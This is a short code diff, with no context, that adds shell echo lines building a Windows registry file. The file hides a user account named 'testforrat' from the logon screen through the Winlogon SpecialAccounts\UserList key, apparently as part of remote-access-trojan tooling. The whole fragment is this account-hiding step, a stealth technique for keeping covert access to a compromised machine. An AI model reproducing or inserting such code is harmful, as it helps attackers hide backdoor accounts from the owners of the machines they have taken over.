@@ -1,0 +1,3 @@
+    echo "Windows Registry Editor Version 5.00"
+    echo "[HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon\SpecialAccounts\UserList]"
+    echo '"testforrat"=dword:00000000;' 
